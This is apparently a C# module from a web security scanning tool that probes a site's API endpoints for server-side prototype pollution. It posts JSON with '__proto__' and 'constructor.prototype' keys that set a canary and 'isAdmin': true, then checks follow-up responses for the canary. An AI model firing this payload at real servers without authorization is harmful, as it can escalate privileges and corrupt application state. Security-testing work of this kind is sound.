using System.Diagnostics;
using System.Text.Json;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Server-side prototype pollution: POST <c>__proto__</c> / <c>constructor.prototype</c>, then GET verify for canary emergence.
/// Requires pre-pollution GET baseline without canary; hard-rejects 400/403/422 on pollution POST.
/// Inspired by OWASP WSTG-INPV-22 and PortSwigger non-DoS PP research; also influenced by pentest-ai <c>web.prototype_pollution</c>.
/// Known limit: detects sinks that echo polluted properties; does not use json-spaces/status-code override gadgets.
/// </summary>
public sealed class PrototypePollutionScanProbe
{
    private const string ProtoCanary = "yes-via-proto";
    private const string CtorCanary = "yes-via-ctor";

    private readonly AutomationContext _ctx;
    private readonly Action<string, string> _log;

    public PrototypePollutionScanProbe(AutomationContext context, Action<string, string> log)
    {
        _ctx = context;
        _log = log;
    }

    public sealed class PrototypePollutionScanOptions
    {
        public int MaxCandidates { get; set; } = 10;
        public int TimeoutMs { get; set; } = 15000;
        public bool IncludeScaffold { get; set; } = true;
        public bool IncludeBrowserCookies { get; set; } = true;
        public List<string>? CandidateUrls { get; set; }
    }

    public sealed class PrototypePollutionFinding
    {
        public string Category { get; init; } = "prototype-pollution";
        public string Severity { get; init; } = "critical";
        public string PostUrl { get; init; } = "";
        public string VerifyUrl { get; init; } = "";
        public string Canary { get; init; } = "";
        public string Detail { get; init; } = "";
        public string Source { get; init; } = "scaffold";
    }

    public sealed class PrototypePollutionScanResult
    {
        public string Message { get; init; } = "";
        public int CandidatesProbed { get; init; }
        public int ElapsedMs { get; init; }
        public List<PrototypePollutionFinding> Findings { get; init; } = [];
        public bool HasFindings => Findings.Count > 0;
    }

    public static readonly string[] DefaultCandidatePaths =
    [
        "/api/users",
        "/api/profile",
        "/api/preferences",
        "/api/settings",
        "/api/account",
        "/api/Users",
        "/preferences",
        "/settings"
    ];

    public static readonly string[] VerifyPaths =
    [
        "/",
        "/health",
        "/status",
        "/api/me"
    ];

    private static readonly int[] HardRejectStatuses = [400, 403, 422];

    public async Task<PrototypePollutionScanResult> RunAsync(
        PrototypePollutionScanOptions options,
        CancellationToken ct = default)
    {
        var sw = Stopwatch.StartNew();
        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running prototype-pollution-scan.");

        var origin = currentUri.GetLeftPart(UriPartial.Authority);
        var candidates = BuildCandidateUrls(origin, options);
        var findings = new List<PrototypePollutionFinding>();
        var probed = 0;
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var postUrl in candidates.Take(options.MaxCandidates))
        {
            ct.ThrowIfCancellationRequested();
            probed++;

            // Per verify URL: GET baseline BEFORE pollution POST; canary must be absent.
            var cleanVerifyUrls = new List<string>();
            foreach (var verifyPath in VerifyPaths)
            {
                ct.ThrowIfCancellationRequested();
                var verifyUrl = verifyPath.StartsWith("http", StringComparison.OrdinalIgnoreCase)
                    ? verifyPath
                    : origin.TrimEnd('/') + (verifyPath.StartsWith('/') ? verifyPath : "/" + verifyPath);

                var baselineGet = await LoginInjectionHelpers.SendAsync(
                    _ctx, verifyUrl, "GET", null, null, options.TimeoutMs,
                    followRedirects: true, options.IncludeBrowserCookies, ct);
                if (baselineGet.Status == 0 || string.IsNullOrEmpty(baselineGet.Body))
                    continue;
                if (DetectCanary(baselineGet.Body) != null)
                    continue;

                cleanVerifyUrls.Add(verifyUrl);
            }

            if (cleanVerifyUrls.Count == 0)
                continue;

            var pollutionPayload = BuildPollutionPayload();
            var pollution = await LoginInjectionHelpers.PostJsonAsync(
                _ctx, postUrl, pollutionPayload, null, options.TimeoutMs,
                followRedirects: true, options.IncludeBrowserCookies, ct);
            if (HardRejectStatuses.Contains(pollution.Status) || pollution.Status == 0)
                continue;

            foreach (var verifyUrl in cleanVerifyUrls)
            {
                ct.ThrowIfCancellationRequested();

                var verify = await LoginInjectionHelpers.SendAsync(
                    _ctx, verifyUrl, "GET", null, null, options.TimeoutMs,
                    followRedirects: true, options.IncludeBrowserCookies, ct);
                if (verify.Status == 0 || string.IsNullOrEmpty(verify.Body))
                    continue;

                var matched = DetectCanary(verify.Body);
                if (matched == null)
                    continue;

                var key = $"{postUrl}->{verifyUrl}";
                if (!seen.Add(key))
                    continue;

                findings.Add(new PrototypePollutionFinding
                {
                    PostUrl = postUrl,
                    VerifyUrl = verifyUrl,
                    Canary = matched,
                    Detail = $"POST with __proto__/constructor.prototype payload; GET canary '{matched}' emerged (absent on pre-pollution baseline).",
                    Source = options.CandidateUrls?.Contains(postUrl) == true ? "explicit" : "scaffold"
                });
                _log($"  FLAG prototype pollution: {postUrl} -> {verifyUrl} ({matched})", "#F44747");
                break;
            }
        }

        return new PrototypePollutionScanResult
        {
            Message = findings.Count > 0
                ? $"{findings.Count} prototype pollution indicator(s) across {probed} candidate(s)."
                : $"No prototype pollution indicators across {probed} candidate(s).",
            CandidatesProbed = probed,
            Findings = findings,
            ElapsedMs = (int)sw.ElapsedMilliseconds
        };
    }

    private static Dictionary<string, object> BuildPollutionPayload() => new(StringComparer.Ordinal)
    {
        ["__proto__"] = new Dictionary<string, object>
        {
            ["polluted"] = ProtoCanary,
            ["isAdmin"] = true
        },
        ["constructor"] = new Dictionary<string, object>
        {
            ["prototype"] = new Dictionary<string, object>
            {
                ["polluted"] = CtorCanary,
                ["isAdmin"] = true
            }
        },
        ["name"] = "trowser-test"
    };

    private static string? DetectCanary(string body)
    {
        if (body.Contains(ProtoCanary, StringComparison.Ordinal))
            return ProtoCanary;
        if (body.Contains(CtorCanary, StringComparison.Ordinal))
            return CtorCanary;
        return null;
    }

    private List<string> BuildCandidateUrls(string origin, PrototypePollutionScanOptions options)
    {
        var urls = new List<string>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        if (options.CandidateUrls is { Count: > 0 })
        {
            foreach (var u in options.CandidateUrls)
            {
                if (seen.Add(u))
                    urls.Add(u);
            }
        }

        foreach (var entry in _ctx.Network.Entries)
        {
            if (!entry.Method.Equals("POST", StringComparison.OrdinalIgnoreCase)
                && !entry.Method.Equals("PUT", StringComparison.OrdinalIgnoreCase)
                && !entry.Method.Equals("PATCH", StringComparison.OrdinalIgnoreCase))
                continue;
            if (!Uri.TryCreate(entry.Url, UriKind.Absolute, out var uri))
                continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;
            if (seen.Add(entry.Url))
                urls.Add(entry.Url);
        }

        if (options.IncludeScaffold)
        {
            foreach (var path in DefaultCandidatePaths)
            {
                var url = path.StartsWith("http", StringComparison.OrdinalIgnoreCase)
                    ? path
                    : origin.TrimEnd('/') + (path.StartsWith('/') ? path : "/" + path);
                if (seen.Add(url))
                    urls.Add(url);
            }
        }

        return urls;
    }
}
